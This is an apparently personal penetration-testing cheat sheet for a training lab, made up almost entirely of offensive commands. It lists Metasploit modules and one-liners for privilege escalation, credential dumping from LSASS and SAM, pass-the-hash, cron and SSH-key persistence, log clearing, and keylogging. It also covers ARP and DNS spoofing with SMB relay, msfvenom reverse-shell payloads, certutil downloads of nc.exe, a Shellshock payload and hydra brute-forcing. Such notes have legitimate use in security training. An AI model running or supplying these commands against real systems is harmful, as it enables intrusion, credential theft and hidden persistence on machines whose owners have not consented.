AUTOPWN -
#> wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins
load db_autopwn
db_autopwn 

Linux PRIVesc -
**find / -perm -4000 2>/dev/null  //looks for setuid bit  //  find / -perm -u=s -type f 2>/dev/null
/bin/chkrootkit -V
use exploit/unix/local/chkrootkit
set CHKROOTKIT /bin/chkrootkit
set session 1
set LHOST 192.60.22.2
exploit **

python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'

** passwd rewrite **
find / -not -type l -perm -o+w
openssl passwd -1 -salt abc password // copy hash
replace * with hash
su into root with new passwd **

hashdump module in msf // get meterpreter session // use post/linux/gather/hashdump // set SESSION #// exploit




LINUX POST EXPLOTATIN -
post/linux/gather/enum_configs
post/multi/gather/env
post/linux/gather/enum_network
post/linux/gather/enum_protections
post/linux/gather/enum_system
post/linux/gather/checkcontainer
post/linux/gather/checkvm
post/linux/gather/enum_users_history
post/multi/manage/system_session
post/linux/manage/download_exec
use post/multi/gather/ssh_creds
use post/multi/gather/docker_creds
use post/linux/gather/ecryptfs_creds
use post/linux/gather/enum_psk
use post/linux/gather/enum_xchat
use post/linux/gather/phpmyadmin_credsteal
use post/linux/gather/pptpd_chap_secrets
use post/linux/manage/sshkey_persistence
lastlog
**** post/linux/gather/hashdump // needs meterpreter shell with root
*** use post/linux/manage/sshkey_persistence //set CREATESSHFOLDER true
wget http://ip/file.txt

Persistance via cron***
echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron // put a bash backdoor instead and connect with nc
crontab -i cron
crontab -l

UAC BYPASS -
net localgroup administrators // shows admins
bypassuac module_injection 
set TARGET 1
set payload 
getsystem

PASS THE HASH -
get meterpreter shell
hashdump
/smb/psexec 
set SMBPass to hash
set SMBUser to user

WINDOWS POST EXP -
enable_rdp // net user administrator password
run getgui -e -u alice -p hack_123321 // in meterprter shell
keyscan_start //keyscan dump
window/local/persistance_service // set up multi handler with same payload and LPORT
post/windows/gather/enum_shares
post/windows/gather/enum_computers
post/windows/gather/enum_applications
post/windows/gather/checkvm
use post/windows/gather/enum_patches
clearev // clears logs from meterpreter
wmic qfe get Caption,Description,HotFixID,InstalledOn
net users
net user administrator
net localgroup
net localgroup administrators
route print
arp -a
netstat -ano
** JAWS
https://github.com/411Hall/JAWS // save file as jasws-enum.ps1
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt


Pivoting WIndows -
run autoroute -s 10.0.19.0/20
background
use auxiliary/scanner/portscan/tcp
set RHOSTS demo2.ine.local
set PORTS 1-100
exploit
sessions -i 1
portfwd add -l 1234 -p 80 -r <IP Address of demo2.ine.local>
portfwd list
nmap -sV -sS -p 1234 localhost
background
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp
set RHOSTS demo2.ine.local
exploit


WMAP -
load wmap 
wmap_sites -a ip 
wmap_targets

ENUM  -
gobuster dir -u http://target.com -w /path/to/wordlist.txt
enum4linux -a // smb*samba enum tool
nmap --script vuln -p 21 demo.ine.local

Access Token Impersonation -
migrate to explorer // pgrep explorer // migrate pid
getprivs // must have SeImpersonatePrivilege
load incognito
list_tokens -u
impersonate_token "ATTACKDEFENSE\Administrator"
migrate explorer

RDP -
rdp_scanner // in msf
hydra - hydra -L usr.txt -P pass.txt rdp://ip -s port#
bluekeep

WebDav -
davtest -auth user:pass -url http://url/webdav
cadaver http://url/webdav // put /usr/share/webshells/asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST= my_ip LPORT=1234 -f asp > payloadname.asp
set payload windows/metrepreter/reverse_tcp 
iis upload // make sure to set Path /webdavdir/payload

WINRM -
scan 5985-6
crackmapexec winrm ip -u user -p pass // -x "command"
evil-winrm.rb -u user -p pass -i ip // gets powershell shell 
wimrm_script_exec // MSF  set FORCE_VBS true

SNMP -
nmap -sU -p 161 --script=snmp-*

DNS & SMB Relay -msfconsole
use exploit/windows/smb/smb_relay
set SRVHOST my_ip
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST my_ip
set SMBHOST 172.16.5.10
exploit
echo "172.16.5.101 *.domainname.com" > dns
dnsspoof -i eth1 -f dns
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eht1 -t targetip1 targetip2
arpspoof -i eth1 -t targetip2 targetip1

SSH -
libssh_auth_bypass

SAMBA -
linux/samba/is_known_pipename


SMB -
ls -al /usr/share/nmap/scripts | grep -e "smb-*" // lists nmap scripts for smb // --script script - uses script
smbclient -L host //check for anonymous login
smbmap -H ip -u user -p pass 
psexec.py user@ip cmd.exe // psawns cmd shell
exploit/windows/psexec //MSF 
/smb/psexec  // set LPORT to new port // set SMBPASS hash lm:ntlm


MSF -
analyze  // anaylzes hosts and ervices in db and provide vulns
searchsploit // gerp Metaploit for payloads in meta
msfvenom -p windows/meterpreter/reverse_tcp LHOST= my_ip LPORT=1234 -f asp > payloadname.asp
use multi/handler
set payload windows/metrepreter/reverse_tcp 

SIGN_INS -
mysql -u username -p
smbclient //192.168.1.1/sharename -U username
sudo mount.cifs //192.168.1.1/sharename /mnt/localfolder -o username=user,password=pass
xfreerdp /u:user /p:pass /v:ip:port

WINDOWS ESC -
C:\Panther\unattended.xml
getsystem //MSF
suggester //MSF 
suggester

KIWI -
get meterpreter session
migrate -N lsass.exe
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets

HYDRA -
hydra -l admin -P /path/to/wordlist.txt http-get://<target_IP>/admin
hydra -l user -P pass.txt ip ftp
hydra -l user -p pass ip ssh

SHELLSHOCK - 
look for cgi, find directory and inject into user-agent
() { :; }; echo; echo; /bin/bash -c 'script'

Rejetto -
use exploit/windows/http/rejetto_hfs_exec

Drupal -
drupalgeddon

TOMCAT -
tomcat_jsp_upload_bypass // MSF
set payload java_shell_bind_tcp
set SHELL cmd

PYTHON WEB SERVER -
sudo python -m SimpleHTTPServer 80
certutil -urlcache -f http://10.10.31.2/nc.exe nc.exe

NMAP -
nmap -Pn -p- -sC -sV (IP) -vvv -oA nmap_full 

WINDOWS -
dir C:\Windows\System32\*.txt /s /b  //shows all files that end with txt
dir C:\flag.txt /s /b
where /r C:\ flag.txt


SHELL UPGRADES -
use multi/manage/shell_to_meterpreter

MYSQL -
msssql 2012 is vulnerable to  mssql_clr_payload 

SMTP -
linux/smtp/haraka

RSYNC -
rsync rsync://target1.ine.local


HOST WEB SERVER -
python -m SimpleHTTPServer 80

COMPILING -
//bin-sploits github -precompiled

HASHCAT --
hashcat -m 1000 -a 0 hashes.txt rockyou.txt    // -m 1000 for nt hashes

WPSCAN -- 
wpscan --url http://www.anywordpressintalledsite.com/ --enumerate u











